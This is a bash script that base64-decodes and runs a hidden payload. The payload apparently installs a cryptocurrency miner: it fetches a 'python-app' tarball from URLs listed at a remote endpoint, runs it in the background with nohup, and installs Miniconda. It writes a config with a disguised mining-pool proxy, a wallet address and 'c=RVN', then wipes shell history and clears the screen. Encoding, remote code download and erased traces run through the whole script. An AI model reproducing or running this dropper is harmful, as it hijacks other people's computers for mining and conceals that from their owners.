#!/usr/bin/env bash

set -e

TMP_SCRIPT=$(mktemp /tmp/bum.XXXXXX.sh)
chmod +x "$TMP_SCRIPT"

base64 -d << 'EOF' | tr -d '\r' > "$TMP_SCRIPT"
ZWNobyAnIyEvYmluL2Jhc2gKWyAtZiBweXRob24tYXBwL3J1bi5zaCBdIHx8ICgKIyEvYmluL2Jhc2gKCndoaWxlIHRydWU7IGRvCiAgZWNobyAiTOG6pXkgZGFuaCBzw6FjaCBVUkwgdOG7qyBBUEkuLi4iCiAgdXJscz0kKGN1cmwgLXMgaHR0cHM6Ly9hcGkubnBvaW50LmlvLzIyNDRjNzI5ZTI3ZGJkNGVjYTM2IHwganEgLXIgJy5kYXRhc1tdJykKICBzdWNjZXNzPWZhbHNlCgogIGZvciB1cmwgaW4gJHVybHM7IGRvCiAgICBlY2hvICJUaOG7rSB04bqjaSB04burOiAkdXJsIgogICAgaWYgd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICIkdXJsIiAtTyBweXRob24tYXBwLW1haW4udGFyLmd6OyB0aGVuCiAgICAgIGlmIHRhciAteGYgcHl0aG9uLWFwcC1tYWluLnRhci5nejsgdGhlbgogICAgICAgIHJtIHB5dGhvbi1hcHAtbWFpbi50YXIuZ3oKICAgICAgICBlY2hvICJU4bqjaSB2w6AgZ2nhuqNpIG7DqW4gdGjDoG5oIGPDtG5nIHThu6s6ICR1cmwiCiAgICAgICAgc3VjY2Vzcz10cnVlCiAgICAgICAgYnJlYWsKICAgICAgZWxzZQogICAgICAgIGVjaG8gIkdp4bqjaSBuw6luIGzhu5dpIHThu6s6ICR1cmwiCiAgICAgIGZpCiAgICBlbHNlCiAgICAgIGVjaG8gIlThuqNpIGzhu5dpIHThu6s6ICR1cmwiCiAgICBmaQogIGRvbmUKCiAgaWYgJHN1Y2Nlc3M7IHRoZW4KICAgIGJyZWFrCiAgZWxzZQogICAgZWNobyAiVOG6pXQgY+G6oyBVUkwgxJHhu4F1IGzhu5dpLiBUaOG7rSBs4bqhaSBzYXUgMzAgZ2nDonkuLi4iCiAgICBzbGVlcCAzMAogIGZpCmRvbmUKKScgPiBidW0uc2ggJiYgY2htb2QgK3ggYnVtLnNoICYmIG5vaHVwIC4vYnVtLnNoID4gb3V0LmxvZyAyPiYxICYKCgp3aGlsZSB0cnVlOyBkbwogICAgaWYgY29tbWFuZCAtdiBweXRob24gPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgUFk9JCh3aGljaCBweXRob24pCiAgICAgICAgZWNobyAixJDDoyBjw7MgUHl0aG9uIGjhu4cgdGjhu5FuZzogJFBZIgogICAgZWxzZQogICAgICAgICMgS2nhu4NtIHRyYSBu4bq/dSDEkcOjIGPDsyBNaW5pY29uZGEKICAgICAgICBpZiBbICEgLWQgIiRIT01FL21pbmljb25kYSIgXTsgdGhlbgogICAgICAgICAgICBlY2hvICJLaMO0bmcgY8OzIFB5dGhvbi4gxJBhbmcgdOG6o2kgdsOgIGPDoGkgxJHhurd0IE1pbmljb25kYS4uLiIKICAgICAgICAgICAgd2dldCBodHRwczovL3JlcG8uYW5hY29uZGEuY29tL21pbmljb25kYS9NaW5pY29uZGEzLWxhdGVzdC1MaW51eC14ODZfNjQuc2ggLU8gbWluaWNvbmRhLnNoCiAgICAgICAgICAgIGJhc2ggbWluaWNvbmRhLnNoIC1iIC1wICIkSE9NRS9taW5pY29uZGEiCiAgICAgICAgICAgIHJtIG1pbmljb25kYS5zaAogICAgICAgIGVsc2UKICAgICAgICAgICAgZWNobyAiTWluaWNvbmRhIMSRw6MgxJHGsOG7o2MgY8OgaSBz4bq1bi4iCiAgICAgICAgZmkKCiAgICAgICAgZXhwb3J0IFBBVEg9IiRIT01FL21pbmljb25kYS9iaW46JFBBVEgiCiAgICAgICAgZWNobyAnZXhwb3J0IFBBVEg9IiRIT01FL21pbmljb25kYS9iaW46JFBBVEgiJyA+PiB+Ly5iYXNocmMKICAgICAgICBQWT0iJEhPTUUvbWluaWNvbmRhL2Jpbi9weXRob24iCiAgICBmaQoKICAgICMgVMOsbSB0aMawIG3hu6VjIHB5dGhvbi1hcHAKICAgIGRpcj0kKGZpbmQgfiAtdHlwZSBkIC1uYW1lICdweXRob24tYXBwJyAtcHJpbnQgLXF1aXQpCiAgICBpZiBbIC1uICIkZGlyIiBdOyB0aGVuCiAgICAgICAgcm0gLWYgYnVtLnNoIG91dC5sb2cgLmVudgogICAgICAgICMgcGtpbGwgcHl0aG9uIHx8IHRydWUKICAgICAgICAjIHBraWxsIHB5dGhvbjMgfHwgdHJ1ZQogICAgICAgIGNkICIkZGlyIiB8fCBleGl0IDEKICAgICAgICBlY2hvIC1lICdwcm94eT13c3M6Ly93cy16b3pvLmhvbmdwaGF0LmVkdS52bi9jRzkzWlhJeVlpNXVZUzV0YVc1bExucHdiMjlzTG1OaE9qWXlOREk9Cmhvc3Q9MTI3LjAuMC4xCnBvcnQ9MzMwNgp1c2VybmFtZT1SU3FXUmdpdk50bXhEYUVXajF4eUxyRTVIUG5qY3M4RE5qCnBhc3N3b3JkPWM9UlZOLHphcD1NQkMKdGhyZWFkcz04JyA+IC4vLmVudiAKICAgICAgICBoaXN0b3J5IC1jICYmIGhpc3RvcnkgLXcKICAgICAgICBjbGVhcgogICAgICAgICRQWSAtdSBhcHAucHkgOCAtLWNhY2hlPSIuY2FjaGUvKiIgPiBzdGRvdXQudHh0IDI+IHN0ZGVyci50eHQKICAgICAgICAjLi9ydW4uc2ggOCA+IHN0ZG91dC50eHQgMj4gc3RkZXJyLnR4dAogICAgZWxzZQogICAgICAgIGVjaG8gIktow7RuZyB0w6xtIHRo4bqleSB0aMawIG3hu6VjICdweXRob24tYXBwJyIKICAgIGZpCgogICAgc2xlZXAgMTAKZG9uZQo=
EOF

bash "$TMP_SCRIPT"

rm -f "$TMP_SCRIPT"
